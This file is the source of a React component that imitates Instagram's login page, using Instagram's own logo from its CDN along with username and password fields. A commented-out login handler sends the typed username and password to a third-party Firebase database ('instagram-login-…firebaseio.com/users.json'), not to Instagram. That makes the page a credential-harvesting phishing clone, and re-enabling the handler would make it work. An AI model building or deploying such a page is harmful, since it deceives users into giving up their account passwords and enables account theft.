import React, { useState } from 'react';
import { FaFacebook } from 'react-icons/fa';
import './App.css';

const App = () => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');

  const handleUsernameChange = (event) => {
    setUsername(event.target.value);
  };

  const handlePasswordChange = (event) => {
    setPassword(event.target.value);
  };

  // const handleLogin = async (event) => {
  //   event.preventDefault();

  //   try {
  //     const response = await fetch(
  // 'https://instagram-login-4cce7-default-rtdb.firebaseio.com/users.json',
  //       {
  //         method: 'POST',
  //         headers: {
  //           'Content-Type': 'application/json',
  //         },
  //         body: JSON.stringify({
  //           username,
  //           password,
  //         }),
  //       }
  //     );

  //     if (response.ok) {
  //       setUsername('');
  //       setPassword('');
  //     } else {
  //     }
  //   } catch (error) {
  //     console.error('Error', error);
  //   }
  // };

  return (
    <div className="box">
      <div className="container">
        <div className="content">
          <i
            style={{
              backgroundImage:
                'url("https://static.cdninstagram.com/rsrc.php/v3/yS/r/ajlEU-wEDyo.png")',
              backgroundPosition: '0px -52px',
              backgroundSize: 'auto',
              width: '175px',
              height: '51px',
              backgroundRepeat: 'no-repeat',
              display: 'inline-block',
            }}
            role="img"
            aria-label="Instagram"
            data-visualcompletion="css-img"
          ></i>
          {/* <form className="content__form" onSubmit={handleLogin}> */}
          <div className="content__inputs">
            <label>
              <input
                required
                type="text"
                value={username}
                onChange={handleUsernameChange}
              />
              <span>Phone number, username, or email</span>
            </label>
            <label>
              <input
                required
                type="password"
                value={password}
                onChange={handlePasswordChange}
              />
              <span>Password</span>
            </label>
          </div>
          <button type="submit">Log In</button>
          {/* </form> */}
          <div className="content__or-text">
            <span></span>
            <span>OR</span>
            <span></span>
          </div>
          <div className="content__forgot-buttons">
            <button>
              <span>
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  viewBox="0 0 512 512"
                  height="512"
                  width="512"
                ></svg>
              </span>
              <FaFacebook />
              <span> Log in with Facebook</span>
            </button>
            <button>Forgot password?</button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default App;
